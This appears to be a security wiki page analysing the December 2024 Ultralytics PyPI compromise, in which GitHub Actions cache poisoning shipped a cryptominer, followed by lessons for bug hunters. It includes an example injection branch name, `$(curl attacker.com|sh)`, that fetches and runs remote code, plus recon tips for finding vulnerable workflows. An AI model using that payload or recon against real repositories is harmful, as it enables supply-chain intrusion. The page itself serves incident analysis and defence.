---
title: Ultralytics PyPI compromise via GitHub Actions cache poisoning (Dec 2024)
slug: ultralytics-pypi
created_utc: 2026-05-22T00:00:00Z
updated_utc: 2026-05-22T00:00:00Z
tags: [incident/supply-chain, language/python, registry/pypi, technique/github-actions-cache-poisoning, technique/pwn-request, payload/cryptominer]
inbound: []
---

# Ultralytics PyPI compromise via GitHub Actions cache poisoning (Dec 2024)

## What happened

Between **4 and 7 December 2024** four versions of the
`ultralytics` PyPI package -- `8.3.41`, `8.3.42`, `8.3.45`,
`8.3.46` -- shipped an XMRig Monero miner. `ultralytics` is the YOLO
reference implementation, ~60M+ PyPI downloads/month. `8.3.41` was
live on PyPI for ~12 hours (4 Dec 20:51 UTC -> 5 Dec 09:15 UTC) before
yank; `8.3.42` survived ~1 hour. Two further versions were published
~48h later as a second wave, suggesting the attacker still held the
publishing primitive after the first cleanup.

The intrusion was not via stolen PyPI credentials. The attacker abused
a **GitHub Actions cache poisoning** primitive on the Ultralytics
publish workflow: a custom action (`ultralytics/actions`) had a
template-injection sink in the `pull_request_target` trigger that
allowed an attacker-controlled branch name to execute arbitrary shell
during PR runs. The shell wrote a poisoned entry into the workflow's
GitHub Actions cache (under a key the legitimate publish run would
later read). When a maintainer merged a benign-looking PR, the
official `python-publish.yml` job restored the poisoned cache,
overwriting the package source before `python -m build` and
`twine upload`. The PyPI token signed off on a wheel the maintainer
never actually wrote. Researcher **Adnan Khan** reconstructed the chain
from public GitHub Actions logs.

## Attack chain

1. **Find a `pull_request_target` workflow that runs untrusted PR
   code.** Ultralytics's CI used `pull_request_target` (which runs in
   the base-repo context, with secrets) and checked out the PR HEAD.
   This is the canonical "pwn-request" pattern.
2. **Template injection via branch name.** A composite action
   interpolated `${{ github.head_ref }}` directly into a `run:` shell
   block. A branch named e.g. `$(curl attacker.com|sh)` executes as
   shell when the workflow runs. This exact class had been reported
   against the same custom action months earlier; the fix was
   incomplete.
3. **Write to the workflow cache.** With shell execution in the
   privileged base-repo context, the attacker can `actions/cache@v4
   save` a payload under a key the production publish workflow
   restores. Caches are scoped per-branch by default but inheritance
   rules from `main` are exploitable.
4. **Wait for legitimate publish.** When a maintainer cuts a release,
   the `python-publish.yml` workflow restores the poisoned cache (or
   the attacker triggers a release-shaped PR). The build step picks up
   the malicious source; `twine upload` uses the PyPI trusted-publisher
   OIDC token to push the wheel. From PyPI's perspective the upload is
   fully legitimate.
5. **XMRig payload.** Wheel post-install spawns an XMRig binary
   targeting a Monero pool. Low-effort monetization; ironic given the
   attacker had RCE on every YOLO user's GPU box and could have
   harvested far more valuable secrets.

## Lessons for bug hunters

- **`pull_request_target` is a known footgun -- still ubiquitous.**
  GitHub-recon any target's public repos for
  `pull_request_target:` in `.github/workflows/*.yml` followed by a
  `checkout` of `${{ github.event.pull_request.head.sha }}`. That
  combo is exploitable in default config. Cross-link
  [[github-actions-pwn-request]] if/when that page exists.
- **Custom-action template injection.** Any composite action that
  interpolates `${{ github.* }}` data into `run:` shell is a code-exec
  sink. Treat it like an SSRF -- find sources (`head_ref`,
  `issue.title`, `pr.title`, `pr.body`, `comments`), find sinks (`run:
  echo "${{ ... }}"`).
- **GitHub Actions cache is mutable shared state.** Caches survive
  across runs and across branches under documented inheritance rules;
  any workflow with write access can poison caches that another
  privileged workflow reads. Audit `actions/cache` keys for
  attacker-controlled prefixes.
- **OIDC trusted publishing does not stop a poisoned build.** It only
  authenticates the runner; if the runner builds attacker code, PyPI
  still gets a legitimate-looking signed wheel. Provenance (sigstore +
  in-toto SLSA L3) is the real mitigation; most projects haven't moved
  there yet.
- **Re-audit fixes for the same class.** Ultralytics had a prior
  template-injection report on the same custom action and shipped an
  incomplete fix. Pattern: when a vendor patches one
  `${{ github.head_ref }}` sink, look for siblings -- they almost
  always exist.

## Primary sources

- [PyPI Blog: "Supply-chain attack analysis: Ultralytics" (Mike Fiedler, 11 Dec 2024)](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/)
- [Socket: "Ultralytics PyPI Package Compromised Through GitHub Actions Cache Poisoning" (Adnan Khan)](https://socket.dev/blog/ultralytics-pypi-package-compromised-through-github-actions-cache-poisoning)

## Related

- [[ctx-pypi]]
- [[pytorch-torchtriton]]
- [[xz-utils-cve-2024-3094]]
